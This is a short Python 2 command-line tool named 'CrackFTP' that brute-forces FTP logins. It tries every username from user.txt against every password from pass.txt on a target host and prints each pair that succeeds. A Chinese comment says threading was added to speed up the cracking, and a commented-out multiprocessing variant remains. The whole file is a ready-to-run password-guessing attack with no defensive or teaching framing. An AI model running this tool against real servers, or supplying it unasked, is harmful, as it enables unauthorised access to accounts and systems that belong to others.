#!/usr/bin/env/python
#-*-coding:utf-8-*-
#__author__:1x2Bytes  改进加入多线程，提高爆破效率
import argparse
from ftplib import FTP
import socket
import sys
#from multiprocessing import Pool
import threading
def banner():
    print'''
  ____                _    _____ _____ ____  
 / ___|_ __ __ _  ___| | _|  ___|_   _|  _ \ 
| |   | '__/ _` |/ __| |/ / |_    | | | |_) |
| |___| | | (_| | (__|   <|  _|   | | |  __/ 
 \____|_|  \__,_|\___|_|\_\_|     |_| |_|    
   @1x2Bytes
   dict : user.txt pass.txt  
    '''

def crackftp(host,port,users,passwd):
    ftp = FTP()
    try:
        ftp.connect(host,port)
        ftp.login(users,passwd)
        print "[%s]CrackSuccess User:%s Pass: %s [+]" % (host,users,passwd)
    except:
        pass

def main():
    parse = argparse.ArgumentParser(description="FTP Crack")
    parse.add_argument('-a', '--host', type=str, help="IP address")
    parse.add_argument('-p', '--port', type=int, help="PORT number", default=21)
    #parse.add_argument('-t', '--thread', type=int, help="Thread number", default=50)
    args = parse.parse_args()
    if not args.host:
        parse.print_help()
        sys.exit(0)
    host = socket.gethostbyname(args.host)
    port = args.port

    banner()
    users = open('user.txt')
    for lines in users:
        user = lines.strip('\n')
        passwords =open('pass.txt')
        for line in passwords:
            pwd = line.strip('\n')
            #p = Pool(6)
            #p.apply_async(func=crackftp,args=(host,port,user,pwd))
            #p.close()
            #p.join()
            t = threading.Thread(target=crackftp, args=(host, port, user, pwd))
            t.start()
            t.join()

if __name__ == "__main__":
    main()

'''
t = threading.Thread(target=crackftp,args=(host,port,user,pwd))
t.start()
t.join()
crackftp(host,port,user,pwd)
'''

